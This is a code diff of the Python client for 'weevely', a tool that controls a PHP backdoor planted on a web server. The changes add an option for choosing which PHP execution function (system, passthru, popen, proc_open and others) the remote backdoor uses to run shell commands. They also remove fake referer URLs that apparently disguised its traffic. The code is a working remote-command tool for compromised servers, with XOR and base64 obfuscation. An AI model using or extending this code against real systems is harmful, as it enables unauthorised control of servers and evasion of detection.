@@ -4,11 +4,6 @@
 from numpy import frombuffer, bitwise_xor, byte
 import getopt, sys, base64, os, urllib2, re, urlparse, os
     
-
-refurls=['https://mail.google.com/mail/?shva=1&inbox=126f670c84e529f0&hl=it', 
-'http://news.google.it/news/story?cf=all&ncl=dP67Os42clPDo8Mt4whHot0vrCj1M&topic=m' ]
-    
-    
 def crypt(text, key):
   text = frombuffer( text, dtype=byte )
   firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
@@ -30,7 +25,7 @@ class weevely:
     self.loadmodules()
   
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'ltgm:c:u:p:o:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output'])
+	opts, args = getopt.getopt(sys.argv[1:], 'ltgm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
@@ -48,6 +43,12 @@ class weevely:
 	if o in ("-m", "-module"):
 	  modul=a
 	  moderun='m'
+	if o in ("-e", "-escape"):
+	  if(int(a)%1==0):
+	    escape=int(a)
+	  else:
+	    print "- Error: escape method is not a valid integer"
+	    sys.exit(1)
 	  
 	if o in ("-u", "-url"):
 	  url=a
@@ -75,12 +76,15 @@ class weevely:
 	  print "! Please specify URL (-u)"
 	  sys.exit(1)
 	  
-	
-	#try:
-	self.host=host(url,pwd)
-	#except Exception, e:
-	  #print "! Error contacting remote backdoor (" + str(e) + "). Exiting."
-	  #sys.exit(1)
+	if('escape') not in locals():
+	  escape=-1;
+	  
+	#self.host=host(url,pwd,escape)
+	try:
+	  self.host=host(url,pwd,escape)
+	except Exception, e:
+	  print "! Error: " + str(e) + ". Exiting."
+	  sys.exit(1)
 	  
 
       if moderun=='g':
@@ -263,128 +267,139 @@ class weevely:
 class host():
   
   
-  def __init__(self,url,pwd):
+  def __init__(self,url,pwd,escape):
     self.url=url
     self.pwd=pwd
     
-    (os, method) = self.checkbackdoor()
+    (os, method) = self.checkbackdoor(escape)
     
     self.method=method
     self.os=os
 
-  def checkbackdoor(self):
+  def checkbackdoor(self, escape):
     
     os = None
+    e = Exception("Escape method number " + str(escape) + " not works. Maybe remote function is unsupported, or url or password are wrong")
     
-    # Eval test + OS check
-    try:
-      os = self.execute_php("echo PHP_OS;")
-    except Exception, e:
-      print '+ Testing remote functions: eval(), system()',
-      
-    # System() test
-    try:
-      ret = self.execute_php("@system('echo " + self.pwd + " 2>&1');")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 0
-
-    # Passthru() test
-    print ', passthru()',
-    try:
-      ret = self.execute_php("@passthru('echo " + self.pwd + " 2>&1');")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 1
-      
-    # pcntl_exec() test
-    print ', pcntl_exec()',
-    try:
-      ret = self.execute_php("$u = Array('" + self.pwd + "'); @pcntl_exec('/bin/echo', $u);")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 2  
-    
-    # popen() test
-    print ', popen()',
-    try:
-      ret = self.execute_php("$h=popen('echo " + self.pwd + " 2>&1', 'r'); while(!feof($h)) { echo fread($h, 2096); } pclose($h);")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 3
-    
-    # exec() test
-    # <?php exec('echo CULO',$o); $re = join('rn', $o); echo $re; ?>
-    print ', exec()',
-    try:
-      ret = self.execute_php("@exec('echo " + self.pwd + " 2>&1', $o); $r = join('rn', $o); echo $r;")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 4
-    
-    # shell_exec() test
-    print ', exec_shell()',
-    try:
-      ret = self.execute_php("@shell_exec('echo " + self.pwd + " 2>&1');")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 5
-    
-    
-    # perl extension test
-    print ', perl->eval()',
-    try:
-      ret = self.execute_php("$perl = new perl(); $r = @perl->system('echo " + self.pwd + " 2>&1'); echo $r")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 6
-    
-    # python extension test
-    print ', python_eval()',
-    try:
-      ret = self.execute_php("@python_eval('import os; os.system('echo " + self.pwd + " 2>&1');")
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 7
-    
-    
-    # proc_open() test
-    #<?php 
-    #$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); 
-    #$h = proc_open('echo CULO', $p, $pipes);
-    #$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]);
-    #fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);
-    #echo $r;
-    #?>
-    tosend = "array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('echo " + self.pwd + "', $p, $pipes);"
-    tosend += "$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h); echo $r;"
-    print ', proc_open()'
-    try:
-      ret = self.execute_php(tosend)
-    except Exception, e:
-      pass
-    else:
-      if self.pwd == ret:
-	return os, 8
-    
-    raise e;
+    print '+ Testing backdoor with functions.. ',
+    if escape == -1 or escape==0:
+      # Eval test + OS check
+      try:
+	os = self.execute_php("echo PHP_OS;")
+      except Exception, e:
+	print 'eval() system() ',
 	
+      # System() test
+      try:
+	ret = self.execute_php("@system('echo " + self.pwd + " 2>&1');")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 0
+
+    if escape == -1 or escape==1:
+      # Passthru() test
+      print 'passthru() ',
+      try:
+	ret = self.execute_php("@passthru('echo " + self.pwd + " 2>&1');")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 1
+
+    if escape == -1 or escape==2:
+      # pcntl_exec() test
+      print 'pcntl_exec() ',
+      try:
+	ret = self.execute_php("$u = Array('" + self.pwd + "'); @pcntl_exec('/bin/echo', $u);")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 2  
+      
+    if escape == -1 or escape==3:
+      # popen() test
+      print 'popen() ',
+      try:
+	ret = self.execute_php("$h=popen('echo " + self.pwd + " 2>&1', 'r'); while(!feof($h)) { echo fread($h, 2096); } pclose($h);")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 3
+      
+    if escape == -1 or escape ==4:
+      # exec() test
+      # <?php exec('echo CULO',$o); $re = join('rn', $o); echo $re; ?>
+      print 'exec() ',
+      try:
+	ret = self.execute_php("@exec('echo " + self.pwd + " 2>&1', $o); $r = join('rn', $o); echo $r;")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 4
+      
+      
+    if escape == -1 or escape ==5:
+      # shell_exec() test
+      print 'exec_shell() ',
+      try:
+	ret = self.execute_php("@shell_exec('echo " + self.pwd + " 2>&1');")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 5
+      
+    if escape == -1 or escape == 6:
+      # perl extension test
+      print 'perl->eval() ',
+      try:
+	ret = self.execute_php("$perl = new perl(); $r = @perl->system('echo " + self.pwd + " 2>&1'); echo $r")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 6
+    
+    if escape == -1 or escape == 7:
+      # python extension test
+      print 'python_eval() ',
+      try:
+	ret = self.execute_php("@python_eval('import os; os.system('echo " + self.pwd + " 2>&1');")
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 7
+      
+    if escape == -1 or escape == 8:
+      # proc_open() test
+      #<?php 
+      #$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); 
+      #$h = proc_open('echo CULO', $p, $pipes);
+      #$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]);
+      #fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);
+      #echo $r;
+      #?>
+      tosend = "array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('echo " + self.pwd + "', $p, $pipes);"
+      tosend += "$r = stream_get_contents ($pipes[1]); $r .= stream_get_contents ($pipes[2]); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h); echo $r;"
+      print 'proc_open()'
+      try:
+	ret = self.execute_php(tosend)
+      except Exception, e:
+	pass
+      else:
+	if self.pwd == ret:
+	  return os, 8
+      
+    raise e;
+    
+    
   def execute_php(self,cmnd):
     
     cmnd=cmnd.strip()
@@ -404,7 +419,7 @@ class host():
       e = re.compile(restring,re.DOTALL)
       founded=e.findall(ret)
       if len(founded)<1:
-	raise Exception('Backdoor doesn\'t produce a valid response, check password or url')
+	raise Exception('No valid responses, check password or url')
       else:
 	return founded[0].strip()
 
